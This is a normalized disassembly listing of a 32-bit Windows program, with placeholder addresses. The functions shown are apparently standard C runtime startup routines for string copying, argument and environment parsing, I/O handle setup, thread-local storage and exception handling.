lea edi [ ecx - 0x4 ]
test ah ah
je r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edi edi
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
add ecx 0x1
test dl dl
je r-xdata
lea edi [ ecx - 0x3 ]
jmp r-xdata
test eax 0xff0000
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
add edi 0x1
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x2 ]
jmp r-xdata
test eax 0xff000000
je r-xdata
test dh dh
je r-xdata
jmp r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_417388
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_415547
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_420097
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_4173d9
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_417388
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x4
pop ebp
retn
sub_417407
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn 0x4
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov eax [ eax + 0x14 ]
cmp eax 0x19930520
je r-xdata
call sub_4208ff
cmp eax 0x19930521
je r-xdata
cmp eax 0x19930522
je r-xdata
cmp eax 0x1994000
jne r-xdata
sub_417457
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
xor esi esi
xor edi edi
mov [ ebp - 0x4 ] edi
cmp edi 0x17
jae r-xdata
inc edi
mov [ ebp - 0x4 ] edi
cmp edi 0x17
jb r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x3
call sub_420eb4
pop ecx
cmp eax 0x1
je r-xdata
cmp ebx [ edi * 8 + rw-data ]
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
push 0x3
call sub_420eb4
pop ecx
test eax eax
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
lea esi [ edi * 8 + rw-data ]
push [ esi ]
call sub_412e40
pop ecx
push eax
push [ esi ]
push ebx
call [ WriteFile@IAT ]
push r--data
mov ebx 0x314
push ebx
mov edi rw-data
push edi
call sub_41cf11
add esp 0xc
test eax eax
je r-xdata
push 0x104
mov esi rw-data
push esi
push 0x0
mov [ rw-data ] 0x0
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_418855
add esp 0x14
push esi
call sub_412e40
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push 0x2fb
push esi
call sub_41cf11
add esp 0xc
test eax eax
je r-xdata
xor esi esi
push esi
call sub_412e40
sub esi 0x3b
add eax esi
push 0x3
mov ecx rw-data
push r--data
sub ecx eax
push ecx
push eax
call sub_420dff
add esp 0x14
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_418855
add esp 0x14
mov eax [ ebp - 0x4 ]
push [ eax * 8 + rw-data ]
push ebx
push edi
call sub_420d8b
add esp 0xc
test eax eax
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_418855
add esp 0x14
xor esi esi
push esi
push esi
push esi
push esi
push esi
call sub_418855
add esp 0x14
jmp r-xdata
push 0x12010
push r--data
push edi
call sub_420c22
add esp 0xc
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_418855
add esp 0x14
push r--data
push ebx
push edi
call sub_420d8b
add esp 0xc
test eax eax
je r-xdata
sub_417602
push 0x3
call sub_420eb4
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_417457
push 0xff
call sub_417457
pop ecx
pop ecx
push 0x3
call sub_420eb4
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_41763c
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
call sub_418001
mov esi eax
test esi esi
je r-xdata
pop esi
leave
retn
mov edx [ esi + 0x5c ]
mov eax [ rw-data ]
push edi
mov edi [ ebp + 0x8 ]
mov ecx edx
push ebx
imul eax eax 0xc
add eax edx
cmp ecx eax
jae r-xdata
mov ebx eax
imul ebx ebx 0xc
add ecx 0xc
add ebx edx
cmp ecx ebx
jb r-xdata
xor eax eax
cmp [ ecx ] edi
jne r-xdata
cmp [ ecx ] edi
je r-xdata
xor eax eax
jmp r-xdata
mov ebx [ eax + 0x8 ]
mov [ ebp - 0x4 ] ebx
test ebx ebx
jne r-xdata
mov eax ecx
jmp r-xdata
pop ebx
pop edi
cmp ebx 0x5
jne r-xdata
test eax eax
je r-xdata
cmp ebx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ esi + 0x60 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp + 0xc ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call ebx
mov ecx [ rw-data ]
mov edi [ rw-data ]
mov edx ecx
add edi ecx
cmp edx edi
jge r-xdata
mov eax [ eax ]
mov edi [ esi + 0x64 ]
cmp eax 0xc000008e
jne r-xdata
imul ecx ecx 0xc
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
mov edi [ rw-data ]
mov ebx [ rw-data ]
inc edx
add ebx edi
add ecx 0xc
cmp edx ebx
jl r-xdata
mov ebx [ ebp - 0x4 ]
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call ebx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
mov [ esi + 0x60 ] eax
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
mov [ esi + 0x64 ] 0x8a
sub_41779c
mov edi edi
push esi
mov esi [ rw-data ]
push edi
xor edi edi
test esi esi
jne r-xdata
movzx eax [ esi ]
test ax ax
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp ax 0x3d
je r-xdata
push ebx
push 0x4
inc edi
push edi
call sub_4186b7
mov ebx eax
pop ecx
pop ecx
mov [ rw-data ] ebx
test ebx ebx
jne r-xdata
pop edi
pop esi
retn
push esi
call sub_411794
pop ecx
lea esi [ esi + eax * 2 + 0x2 ]
inc edi
mov esi [ rw-data ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
pop ebx
push esi
call sub_411794
mov edi eax
inc edi
cmp [ esi ] 0x3d
pop ecx
je r-xdata
push [ rw-data ]
call sub_4121b5
and [ rw-data ] 0x0
and [ ebx ] 0x0
mov [ rw-data ] 0x1
xor eax eax
lea esi [ esi + edi * 2 ]
push 0x2
push edi
call sub_4186b7
pop ecx
pop ecx
mov [ ebx ] eax
test eax eax
je r-xdata
push [ rw-data ]
call sub_4121b5
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push edi
push eax
call sub_420230
add esp 0xc
test eax eax
je r-xdata
pop ecx
add ebx 0x4
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_418855
add esp 0x14
sub_41787a
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
xor edx edx
push edi
mov edi [ ebp + 0xc ]
mov [ ebx ] edx
mov esi ecx
mov [ edi ] 0x1
cmp [ ebp + 0x8 ] edx
je r-xdata
cmp [ eax ] 0x22
jne r-xdata
mov ecx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ecx ] esi
inc [ ebx ]
test esi esi
je r-xdata
mov edi [ ebp + 0xc ]
xor ecx ecx
test edx edx
sete cl
push 0x22
inc eax
inc eax
mov edx ecx
pop ecx
jmp r-xdata
movzx ecx [ eax ]
inc eax
inc eax
test cx cx
je r-xdata
mov cx [ eax ]
mov [ esi ] cx
inc esi
inc esi
test edx edx
jne r-xdata
dec eax
dec eax
jmp r-xdata
cmp cx 0x20
je r-xdata
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
cmp cx 0x9
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax edx
je r-xdata
movzx ecx [ eax ]
cmp cx 0x20
je r-xdata
xor ecx ecx
mov [ esi - 0x2 ] cx
inc [ edi ]
pop edi
pop esi
leave
retn
mov [ eax ] edx
inc eax
inc eax
jmp r-xdata
cmp cx 0x9
jne r-xdata
cmp [ eax ] dx
je r-xdata
cmp [ ebp + 0x8 ] edx
je r-xdata
inc [ edi ]
mov ecx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ecx ] esi
cmp [ eax ] 0x5c
je r-xdata
inc eax
inc eax
inc edx
cmp [ eax ] 0x22
jne r-xdata
test edx edx
jne r-xdata
test dl 0x1
jne r-xdata
dec edx
test esi esi
je r-xdata
movzx ecx [ eax ]
test cx cx
je r-xdata
shr edx 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
inc [ ebx ]
push 0x5c
pop ecx
mov [ esi ] cx
inc esi
inc esi
test esi esi
je r-xdata
cmp [ ebp - 0x4 ] edx
jne r-xdata
xor ecx ecx
xor edi edi
cmp [ ebp - 0x4 ] ecx
sete cl
mov [ ebp - 0x4 ] ecx
lea ecx [ eax + 0x2 ]
cmp [ ecx ] 0x22
jne r-xdata
inc [ ebx ]
mov edi [ ebp + 0xc ]
jmp r-xdata
xor ecx ecx
mov [ esi ] cx
inc esi
inc esi
test edi edi
je r-xdata
cmp cx 0x20
je r-xdata
mov eax ecx
jmp r-xdata
xor edx edx
cmp [ eax ] dx
je r-xdata
inc eax
inc eax
jmp r-xdata
test esi esi
je r-xdata
cmp cx 0x9
je r-xdata
xor edi edi
inc edi
xor edx edx
jmp r-xdata
inc [ ebx ]
mov [ esi ] cx
inc esi
inc esi
sub_4179cb
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
push 0x104
mov esi rw-data
push esi
xor eax eax
xor ebx ebx
push ebx
mov [ rw-data ] ax
call [ GetModuleFileNameW@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
cmp eax ebx
je r-xdata
mov edi esi
mov edi eax
cmp [ eax ] bx
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0x8 ]
cmp ecx 0x7fffffff
jae r-xdata
lea eax [ ebp - 0x4 ]
push eax
push ebx
lea ebx [ ebp - 0x8 ]
xor ecx ecx
mov eax edi
call sub_41787a
mov ebx [ ebp - 0x4 ]
pop ecx
pop ecx
cmp ebx 0x3fffffff
jae r-xdata
lea eax [ ecx + ebx * 2 ]
add eax eax
add ecx ecx
cmp eax ecx
jb r-xdata
push eax
call sub_418672
mov esi eax
pop ecx
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ esi + ebx * 4 ]
push esi
lea ebx [ ebp - 0x8 ]
mov eax edi
call sub_41787a
mov eax [ ebp - 0x4 ]
dec eax
pop ecx
mov [ rw-data ] eax
pop ecx
mov [ rw-data ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_417a79
mov edi edi
push esi
call [ GetEnvironmentStringsW@IAT ]
mov esi eax
xor ecx ecx
cmp esi ecx
jne r-xdata
cmp [ esi ] cx
je r-xdata
xor eax eax
pop esi
retn
sub eax esi
inc eax
push ebx
inc eax
mov ebx eax
push edi
push ebx
call sub_418672
mov edi eax
pop ecx
test edi edi
jne r-xdata
inc eax
inc eax
cmp [ eax ] cx
jne r-xdata
push ebx
push esi
push edi
call sub_416940
add esp 0xc
jmp r-xdata
push esi
call [ FreeEnvironmentStringsW@IAT ]
mov eax edi
pop edi
pop ebx
pop esi
retn
inc eax
inc eax
cmp [ eax ] cx
jne r-xdata
sub_417ad6
push 0x54
push r--data
call sub_4183f0
xor edi edi
mov [ ebp - 0x4 ] edi
lea eax [ ebp - 0x64 ]
push eax
call [ GetStartupInfoA@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
push 0x40
push 0x20
pop esi
push esi
call sub_4186b7
pop ecx
pop ecx
cmp eax edi
je r-xdata
or eax 0xffffffff
mov [ rw-data ] eax
mov [ rw-data ] esi
lea ecx [ eax + 0x800 ]
jmp r-xdata
cmp eax ecx
jb r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
mov [ eax + 0x8 ] edi
mov [ eax + 0x24 ] 0x0
mov [ eax + 0x25 ] 0xa
mov [ eax + 0x26 ] 0xa
mov [ eax + 0x38 ] edi
mov [ eax + 0x34 ] 0x0
add eax 0x40
mov ecx [ rw-data ]
add ecx 0x800
cmp [ ebp - 0x32 ] di
je r-xdata
xor ebx ebx
mov eax [ ebp - 0x30 ]
cmp eax edi
je r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov edi [ eax ]
lea ebx [ eax + 0x4 ]
lea eax [ ebx + edi ]
mov [ ebp - 0x1c ] eax
mov esi 0x800
cmp edi esi
jl r-xdata
mov eax ebx
dec eax
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
mov [ ebp - 0x20 ] 0x1
jmp r-xdata
mov edi esi
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
cmp ebx 0x3
jl r-xdata
cmp [ rw-data ] edi
jl r-xdata
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
jmp r-xdata
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
push 0x40
push 0x20
call sub_4186b7
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
call sub_418435
retn
mov [ esi ] edi
and eax 0xff
cmp eax 0x2
jne r-xdata
mov edi [ rw-data ]
mov ecx [ ebp - 0x20 ]
lea ecx [ ecx * 4 + rw-data ]
mov [ ecx ] eax
add [ rw-data ] 0x20
lea edx [ eax + 0x800 ]
jmp r-xdata
and [ ebp - 0x20 ] 0x0
test edi edi
jle r-xdata
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
cmp ecx 0xffffffff
je r-xdata
cmp eax edx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_420b79
pop ecx
pop ecx
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
inc [ ebp - 0x20 ]
inc ebx
add [ ebp - 0x1c ] 0x4
cmp [ ebp - 0x20 ] edi
jl r-xdata
cmp ecx 0xfffffffe
je r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
and [ eax + 0x24 ] 0x80
mov [ eax + 0x25 ] 0xa
mov [ eax + 0x26 ] 0xa
and [ eax + 0x38 ] 0x0
mov [ eax + 0x34 ] 0x0
add eax 0x40
mov edx [ ecx ]
add edx esi
inc [ ebp - 0x20 ]
inc [ esi + 0x8 ]
jmp r-xdata
mov al [ ebx ]
test al 0x1
je r-xdata
test al 0x8
jne r-xdata
mov esi [ ebp - 0x20 ]
mov eax esi
sar eax 0x5
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov [ esi ] eax
mov al [ ebx ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_420b79
pop ecx
pop ecx
test eax eax
je r-xdata
push ecx
call [ GetFileType@IAT ]
test eax eax
je r-xdata
inc [ esi + 0x8 ]
sub_417d2a
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_417d50
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_417d76
mov edi edi
push ebp
mov ebp esp
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
push esi
call sub_416eed
pop ecx
test eax eax
je r-xdata
push eax
push [ rw-data ]
call esi
call eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop ebp
retn
push [ ebp + 0x8 ]
call eax
mov [ ebp + 0x8 ] eax
mov eax [ eax + 0x1f8 ]
jmp r-xdata
test eax eax
je r-xdata
sub_417df1
mov edi edi
push ebp
mov ebp esp
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
push esi
call sub_416eed
pop ecx
test eax eax
je r-xdata
push eax
push [ rw-data ]
call esi
call eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop ebp
retn
push [ ebp + 0x8 ]
call eax
mov [ ebp + 0x8 ] eax
mov eax [ eax + 0x1fc ]
jmp r-xdata
test eax eax
je r-xdata
sub_417e8c
mov edi edi
push esi
push [ rw-data ]
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push [ rw-data ]
call sub_417df1
pop ecx
mov esi eax
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
sub_417edd
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rw-data ]
call sub_417df1
pop ecx
call eax
or [ rw-data ] 0xffffffff
jmp sub_419e68
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
sub_417f1a
push 0xc
push r--data
call sub_4183f0
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] eax
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
test eax eax
je r-xdata
push esi
call sub_416eed
pop ecx
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov [ esi + 0x68 ] rw-data
push 0xd
call sub_419f99
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_417fef
push 0xc
call sub_419f99
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push r--data
push eax
mov ebx [ GetProcAddress@IAT ]
call ebx
mov [ esi + 0x1f8 ] eax
push r--data
push [ ebp - 0x1c ]
call ebx
mov [ esi + 0x1fc ] eax
push [ esi + 0x6c ]
call sub_41fc56
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_417ff8
call sub_418435
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_418001
mov edi edi
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_417e8c
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_4186b7
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call sub_417df1
pop ecx
call eax
test eax eax
je r-xdata
push esi
call sub_4121b5
pop ecx
xor esi esi
push 0x0
push esi
call sub_417f1a
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_418094
push 0x8
push r--data
call sub_4183f0
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_418435
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_4121b5
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_4121b5
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_4121b5
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_4121b5
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_4121b5
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_4121b5
pop ecx
mov eax [ esi + 0x5c ]
cmp eax r--data
je r-xdata
push eax
call sub_4121b5
pop ecx
push 0xd
call sub_419f99
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_4121b5
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4181ae
push 0xc
call sub_419f99
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4181ba
push esi
call sub_4121b5
pop ecx
push edi
call sub_41fce5
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_4121b5
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_41fb0d
pop ecx
sub_4181c3
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
push 0x0
push eax
call [ TlsSetValue@IAT ]
push 0x0
push [ rw-data ]
push [ rw-data ]
call sub_417df1
pop ecx
call eax
push [ ebp + 0x8 ]
call sub_418094
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
pop esi
push [ rw-data ]
push [ rw-data ]
call esi
call eax
mov [ ebp + 0x8 ] eax
sub_418231
mov edi edi
push esi
push edi
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov edi eax
test edi edi
je r-xdata
push esi
call sub_416eed
pop ecx
call sub_417edd
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rw-data ] eax
je r-xdata
mov eax [ TlsGetValue@IAT ]
mov [ rw-data ] eax
mov eax [ TlsFree@IAT ]
mov [ rw-data ] sub_417e63
mov [ rw-data ] esi
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push [ rw-data ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_4171d9
push [ rw-data ]
call sub_417d76
push [ rw-data ]
mov [ rw-data ] eax
call sub_417d76
push [ rw-data ]
mov [ rw-data ] eax
call sub_417d76
push [ rw-data ]
mov [ rw-data ] eax
call sub_417d76
add esp 0x10
mov [ rw-data ] eax
call sub_419e1d
test eax eax
je r-xdata
test eax eax
jne r-xdata
push sub_418094
push [ rw-data ]
call sub_417df1
pop ecx
call eax
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call [ TlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
push 0x214
push 0x1
call sub_4186b7
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call sub_417df1
pop ecx
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_417f1a
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
retn
sub_4183be
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] eax
push 0x0
sete al
push 0x1000
push eax
call [ HeapCreate@IAT ]
mov [ rw-data ] eax
test eax eax
jne r-xdata
xor eax eax
inc eax
mov [ rw-data ] eax
pop ebp
retn
pop ebp
retn
sub_4183f0
push sub_418450
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_418450
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rw-data ]
push edi
mov eax [ esi ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
lea edi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_411f81
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_411f81
mov edx 0xfffffffe
cmp [ ebx + 0xc ] edx
je r-xdata
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x18 ]
mov [ ebx - 0x4 ] edx
mov ebx [ ebx + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
cmp ebx 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push edi
mov ecx ebx
call sub_41bf48
jmp r-xdata
lea ecx [ ecx ]
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov ebx eax
cmp eax 0xfffffffe
jne r-xdata
mov edx edi
call sub_41befe
mov [ ebp - 0x1 ] 0x1
test eax eax
jl r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_411f81
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_411f81
lea eax [ ebx + ebx * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
lea eax [ esi + eax * 4 + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
